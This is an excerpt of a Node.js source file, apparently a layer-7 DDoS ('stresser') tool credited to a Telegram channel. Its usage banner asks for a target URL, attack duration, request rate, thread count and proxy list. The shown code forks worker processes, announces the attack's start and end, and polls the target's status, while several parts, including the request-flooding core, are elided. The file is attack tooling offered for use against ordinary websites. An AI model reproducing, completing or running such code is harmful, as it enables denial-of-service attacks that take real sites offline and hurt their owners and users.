 ...
 if (process.argv.length < 7){console.log(`
           METHOD DDOS LATER 7 DEVELOPMENT BY t.me/exoticstresser1                 
           
Usage: node HTTPX.js Target Time Rate Thread ProxyFile
Example: node HTTPX.js https://target.com 120 32 8 proxy.txt
`); process.exit();}
 const headers = {};
 ...
 const getCurrentTime = () => {
  ...
  const timeoutPromise = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('\x1b[1m\x1b[31mRequest Timed Out\x1b[0m'));
    }, 5000);
  });
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} \x1b[1m[\x1b[0m\x1b[1;36m\x1b[38;2;7;19;255mEXOTIC\x1b[0m\x1b[1m]\x1b[0m  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === '\x1b[1m\x1b[31mRequest Timed Out\x1b[0m') {
        console.log(`${getCurrentTime()} \x1b[1m[\x1b[0m\x1b[1;36m\x1b[38;2;7;19;255mEXOTIC\x1b[0m\x1b[1m]\x1b[0m  Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} \x1b[1m[\x1b[0m\x1b[1;36m\x1b[38;2;7;19;255mEXOTIC\x1b[0m\x1b[1m]\x1b[0m  Title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} \x1b[1m[\x1b[0m\x1b[1;36m\x1b[38;2;7;19;255mEXOTIC\x1b[0m\x1b[1m]\x1b[0m  ${error.message}`);
      }
    });
}
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} \x1b[1m[\x1b[0m\x1b[1;36m\x1b[38;2;7;19;255mEXOTIC\x1b[0m\x1b[1m]\x1b[0m  Attack Thread ${i} Started`);
  }
  console.log(`${getCurrentTime()} \x1b[1m[\x1b[0m\x1b[1;36m\x1b[38;2;7;19;255mEXOTIC\x1b[0m\x1b[1m]\x1b[0m  The Attack Has Started`);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} \x1b[1m[\x1b[0m\x1b[1;36m\x1b[38;2;7;19;255mEXOTIC\x1b[0m\x1b[1m]\x1b[0m  The Attack Is Over`);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
